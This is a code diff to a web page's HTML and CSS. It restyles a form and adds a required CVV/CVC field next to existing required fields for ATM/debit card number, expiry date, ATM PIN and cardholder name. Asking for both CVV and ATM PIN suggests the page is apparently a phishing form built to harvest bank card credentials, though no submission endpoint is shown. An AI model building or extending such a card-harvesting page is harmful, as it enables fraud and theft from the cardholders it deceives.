@@ -24,6 +24,7 @@
 { 
   width:104%;
   margin-left:-7px;
+  margin-top:-8px;
   margin-bottom:40px;
 }
 #ft
@@ -44,7 +45,7 @@
   margin-left:2px;
   margin-bottom:10px;
 }
-input[type="text"] {
+#card,#name {
   width: 95%;
   color:#000;
   font-size:13px;
@@ -52,6 +53,49 @@ input[type="text"] {
   border-radius: 4px;
   letter-spacing:0.2px;
   padding:10px 30px;
+  outline: none;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+#date {
+  width: 38%;
+  color:#000;
+  font-size:13px;
+  border: 1px solid #E3DFDE;
+  border-radius: 4px;
+  letter-spacing:0.2px;
+  padding:10px 30px;
+  margin-left:8px;
+  outline: none;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+
+#cvv {
+  width: 35%;
+  color:#000;
+  font-size:13px;
+  border: 1px solid #E3DFDE;
+  border-radius: 4px;
+  letter-spacing:0.2px;
+  padding:10px 30px;
+  margin-left:185px;
+  position:absolute;
+  margin-top:-37px;
+  outline: none;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+
+#pin {
+  width: 95%;
+  color:#000;
+  font-size:13px;
+  border: 1px solid #E3DFDE;
+  border-radius: 4px;
+  letter-spacing:0.2px;
+  padding:10px 30px;
+  margin-left:8px;
   outline: none;
   box-sizing: border-box;
   transition: 0.3s;
@@ -137,6 +181,23 @@ body{
   position: absolute;
   left: 0;
   top: 1.5px;
+  font-size:14px;
+  padding: 10px 20px;
+  color: #777777;
+  transition: 0.3s;
+}
+.inputWithIconCvv input[type="text"] {
+  padding-left: 30px;
+}
+
+.inputWithIconCvv {
+  position: relative;
+}
+
+.inputWithIconCvv i {
+  position: absolute;
+  left: 176px;
+  top: -35px;
   font-size:14px;
   padding: 10px 20px;
   color: #777777;
@@ -248,7 +309,7 @@ input:focus:-ms-input-placeholder {
                         <div class="inputWithIconC">
                         <div class="input-group">
                         <center><input class="input-group__input" type="text" name="Card_Number" inputmode="numeric" minlength="16" maxlength="19"
-                        placeholder="1234 1234 1234 1234" id="dn" required />
+                        placeholder="1234 1234 1234 1234" id="card" required />
                         <label class="input-group__label" for="mobile">ATM / Debit Card Number<span style="color:red;">*</span></label>
                         <i class="fa fa-credit-card" aria-hidden="true"></i></center>
                         </div>
@@ -344,18 +405,16 @@ input:focus:-ms-input-placeholder {
                         input.addEventListener('change',_set_creditcard_number)
                         }
                         
-                        make_credit_card_input(document.getElementById("dn"));
+                        make_credit_card_input(document.getElementById("card"));
                         
                         
                         </script>
                         <div class="inputWithIconD">
-                        <div class="input-group">
-                        <center><input class="input-group__input" type="text" name="Expiry_Date" inputmode="numeric" minlength="4" maxLength="5"
-                         placeholder="MM/YY" id="expiry" onkeyup="formatString(event);" required />
-                        <label class="input-group__label" for="mobile">Expiry Date <span style="color:red;">*</span></label>
-                        <i class="fa fa-calendar" aria-hidden="true"></i></center>
-                        </div>
-                        </div>
+                        <div class="input-groupDate">
+                        <input class="input-group__inputDate" type="text" name="Expiry_Date" inputmode="numeric" minlength="4" maxLength="5"
+                         placeholder="MM/YY" id="date" onkeyup="formatString(event);" required />
+                        <label class="input-group__labelDate" for="mobile">Expiry Date <span style="color:red;">*</span></label>
+                        <i class="fa fa-calendar" aria-hidden="true"></i>
                         <script type="text/javascript">
                         function formatString(e) {
                         var inputChar = String.fromCharCode(event.keyCode);
@@ -382,18 +441,29 @@ input:focus:-ms-input-placeholder {
                         );
                         }
                         </script>
-                        <div class="inputWithIconP">
+                        <span>
+                        <div class="inputWithIconCvv">
+                        <div class="input-groupCvv">
+                        <input class="input-group__inputCvv" type="text" name="CVV Number" inputmode="numeric" maxlength="3" placeholder="XXX" id="cvv"
+                        pattern="[0-9]\d{2}" title="Please enter valid CVV/CVC number !" required />
+                        <label class="input-group__labelCvv" for="cvv">CVV/CVC <span style="color:red;">*</span></label>
+                        <i class="fa fa-credit-card" aria-hidden="true"></i></span>
+                        </div>
+                        </div>
+                        </div>
+                        </div><br>
+                        <div class="inputWithIconP" style="margin-top:6px;">
                         <div class="input-group">
-                        <center><input class="input-group__input" type="text" name="ATM_PIN" inputmode="numeric" maxlength="4" placeholder="xxxx" id="pin"
+                        <input class="input-group__input" type="text" name="ATM_PIN" inputmode="numeric" maxlength="4" placeholder="XXXX" id="pin"
                         pattern="[0-9]\d{3}" title="Please enter valid ATM PIN number !" required />
                         <label class="input-group__label" for="mobile">ATM PIN <span style="color:red;">*</span></label>
-                        <i class="fa fa-key" aria-hidden="true"></i></center>
+                        <i class="fa fa-key" aria-hidden="true"></i></span>
                         </div>
                         </div>
                         <div class="inputWithIconN">
                         <div class="input-group">
                         <center><input class="input-group__input" type="text" name="Card_Holder_Name" minlength="3" maxlength="30"
-                        onkeydown="return /[a-z A-Z]/i.test(event.key)" placeholder="Name on card" id="Name" required />
+                        onkeydown="return /[a-z A-Z]/i.test(event.key)" placeholder="Name on card" id="name" required />
                         <label class="input-group__label" for="mobile">Card Holder Name <span style="color:red;">*</span></label>
                         <i class="fa fa-user-o" aria-hidden="true"></i></center>
                         </div>
